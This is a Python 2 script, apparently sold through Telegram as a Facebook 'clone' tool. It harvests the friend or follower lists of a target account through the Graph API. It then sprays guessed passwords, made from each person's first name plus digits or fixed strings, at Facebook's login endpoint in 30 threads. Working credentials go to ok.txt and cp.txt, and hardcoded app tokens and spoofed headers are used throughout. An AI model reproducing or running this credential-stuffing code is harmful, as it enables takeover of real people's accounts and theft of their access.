try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
os.system("clear")
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
os.system('clear')
logo5 = """


	    __  __       _
|  \/  | __ _| | __ _ _ __ ___
| |\/| |/ _` | |/ _` | '_ ` _ \
| |  | | (_| | | (_| | | | | | |
|_|  |_|\__,_|_|\__,_|_| |_| |_|


--------------------------------------------------
  Author   : Maaalaaam
  Tlegram Channel   : @dec_tool
  Telegram : @mala_bek4s
  Note : 10$
--------------------------------------------------
                """
def dark():
    os.system("clear")
    print logo5
    print("Welcome to new xbn tool")
    time.sleep(0)
    os.system("clear")
    print logo5
    print("[1]ID Clone login with facebook ")
    print("-----------------------------------------------")
    dark__select()
def dark__select():
    zed = raw_input("\n==  ")
    if zed =="1":
        b_menu()
    elif zed =="2":
        dark_pro()
    else:
        os.system('"\t    \033[1;31mSelect a valid option "')
        dark__select()
def login():
    os.system("clear")
    print logo5
    print('"[1]Daxl bun ba Token   "')
    print('"-----------------------------------------------"')
    login_select()
def login_select():
    hedi = raw_input("\n= ")
    if hedi =="1":
        os.system("clear")
        print logo5
        print('" \t    \033[1;32mlogin with token\033[0;97m "')
        print('"-----------------------------------------------"')
        token = raw_input(" Token : ")
        os.system('"-----------------------------------------------"')
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("\t\033[1;97mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            dark()
        except (KeyError , IOError):
            os.system('" \t    \033[1;31mToken not valid\033[0;97m "')
            raw_input(" Press enter to try again ")
            login()
    elif abm =="18283":
        login_fb()
    else:
        print("\t    "+c+"Select valid method"+c2)
        login_select()
def login_fb():
        os.system("clear")
        print logo5
        os.system('" \t    \033[1;32mlogin with password\033[0;97m "')
        os.system('" \t    \033[1;32muse any proxy to login\033[0;97m "')
        os.system('"-----------------------------------------------"')
        id = raw_input(" ID/Mail/Num : ")
        id1=id.replace(' ','')
        id2=id1.replace('(','')
        uid=id2.replace(')','')
        pwd = raw_input(" Password   : ")
        os.system('"-----------------------------------------------"')
        logging()
        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
        q = json.loads(data)
        if "access_token" in q:
            succ = open(".login.txt","w")
            succ.write(q["access_token"])
            succ.close()
            os.system('" \n\033[1;92m Login Successfull\033[0;97m "')
            time.sleep(1)
            menu()
        else:
            if "www.facebook.com" in q["error_msg"]:
                os.system('" \n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m "')
                time.sleep(1)
                login_fb()
            else:
                os.system('"\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m  "')
                time.sleep(1)
                login_fb()
def b_menu():
    global token
    os.system("clear")
    print logo5
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("\t    "+c+"ID has checkpoint"+c2)
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo5
        os.system('" \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "')
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    print logo5
    print("\t  "+c+"User ID"+ok+c2)
    print('"-----------------------------------------------"')
    print('"[1]Clone From Public ID "')
    print('"[2]Clone From Followers "')
    print('"[0]Logout "')
    print('"-----------------------------------------------"')
    b_menu_select()
def b_menu_select():
        abm = raw_input("\n =")
        id=[]
        oks=[]
        cps=[]
        if abm =="1":
                os.system("clear")
                print logo5
                print('"\t    Public ID Menu " ')
                print('"-----------------------------------------------"')
                idt = raw_input(" Enter ID/Username :  ")
                os.system('"-----------------------------------------------"')
                time.sleep(2)
                os.system("clear")
                print logo5
                time.sleep(2)
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
                        q = json.loads(r.text)
                        os.system("clear")
                        print logo5
                        print('"\t    Public ID Menu " ')
                        print('"-----------------------------------------------"')
                        print(" User ID : "+q["name"])
                except (KeyError , IOError):
                    os.system('" \n\t    \033[1;31m Logged in id has been checkpoint\033[0;97m "')
                    raw_input("\nPress enter to back ")
                    b_menu()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif abm =="2":
                os.system("clear")
                print logo5
                print('"\t    Followers ID Menu " ')
                print('"-----------------------------------------------"')
                idt = raw_input(" Enter ID/Username : ")
                time.sleep(2)
                os.system("clear")
                print logo5
                print("")
                print("")
                print("")
                print('"\t    Please Wait " ')
                print("")
                print("")
                print("")
                time.sleep(5)
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        os.system("clear")
                        print logo5
                        print('"\t    Followers ID Menu" ')
                        print(" User ID : "+q["name"])
                        print('"-----------------------------------------------"')
                except (KeyError , IOError):
                    os.system('" \t    \033[1;31m Logged in id has been checkpoint\033[0;97m"')
                    raw_input("\nPress enter to back ")
                    b_menu()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)

        print(" ALL ID   : "+str(len(id)))
        time.sleep(2)
        os.system("clear")
        print logo5
        print('"Please wait 15min____30min "')
        print('"-----------------------------------------------"')


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:
                    pass1=name+"123"
                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\n\x1b[1;92m\xe2\x95\x94[CP = OPEN] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass1 + '\n\xe2\x95\x9aNAW: ' +name
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass1 + '\n\xe2\x95\x9aNAW: ' +name
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:
                            pass2=name+"1234"
                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\n\x1b[1;92m\xe2\x95\x94[CP = OPEN] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass2 + '\n\xe2\x95\x9aNAW: ' +name
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass2 + '\n\xe2\x95\x9aNAW: ' +name
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass3=name+"12345"
                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                                    d=json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\n\x1b[1;92m\xe2\x95\x94[CP = OPEN] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass3 + '\n\xe2\x95\x9aNAW: ' +name
                                        cp=open("cp.txt","a")
                                        cp.write(uid+" | "+pass3+"\n")
                                        cp.close()
                                        cps.append(uid)
                                    else:
                                        if 'access_token' in d:
                                            print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass3 + '\n\xe2\x95\x9aNAW: ' +name
                                            ok=open("ok.txt","a")
                                            ok.write(uid+" | "+pass3+"\n")
                                            ok.close()
                                            oks.append(uid)
                                        else:
                                            pass4=name+"1122334455"
                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                                            d=json.loads(q)
                                            if 'www.facebook.com' in d['error_msg']:
                                                print '\n\x1b[1;92m\xe2\x95\x94[CP = OPEN] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass4 + '\n\xe2\x95\x9aNAW: ' +name
                                                cp=open("cp.txt","a")
                                                cp.write(uid+" | "+pass4+"\n")
                                                cp.close()
                                                cps.append(uid)
                                            else:
                                                if 'access_token' in d:
                                                    print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass4 + '\n\xe2\x95\x9aNAW: ' +name
                                                    ok=open("ok.txt","a")
                                                    ok.write(uid+" | "+pass4+"\n")
                                                    ok.close()
                                                    oks.append(uid)
                                                else:
                                                    pass5="112233445566"
                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                                                    d=json.loads(q)
                                                    if 'www.facebook.com' in d['error_msg']:
                                                        print '\n\x1b[1;92m\xe2\x95\x94[CP = OPEN] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass5 + '\n\xe2\x95\x9aNAW: ' +name
                                                        cp=open("cp.txt","a")
                                                        cp.write(uid+" | "+pass5+"\n")
                                                        cp.close()
                                                        cps.append(uid)
                                                    else:
                                                        if 'access_token' in d:
                                                            print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass5 + '\n\xe2\x95\x9aNAW: ' +name
                                                            ok=open("ok.txt","a")
                                                            ok.write(uid+" | "+pass5+"\n")
                                                            ok.close()
                                                            oks.append(uid)
                                                        else:
                                                            pass6="1122334455"
                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                                                            d=json.loads(q)
                                                            if 'www.facebook.com' in d['error_msg']:
                                                                print '\n\x1b[1;92m\xe2\x95\x94[CP = Open] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass6 + '\n\xe2\x95\x9aNAW: ' +name
                                                                cp=open("cp.txt","a")
                                                                cp.write(uid+" | "+pass6+"\n")
                                                                cp.close()
                                                                cps.append(uid)
                                                            else:
                                                                if 'access_token' in d:
                                                                    print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass6 + '\n\xe2\x95\x9aNAW: ' +name
                                                                    ok=open("ok.txt","a")
                                                                    ok.write(uid+" | "+pass6+"\n")
                                                                    ok.close()
                                                                    oks.append(uid)

                                                              

                                                              

                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print('"-----------------------------------------------"')
        print('" Process has completed "')
        print (" Total CP/OK : "+str(len(cps)) + "/"+str(len(oks)))
        os.system('"-----------------------------------------------"')
        raw_input(" Press enter to main menu back ")
        b_menu()






dark()
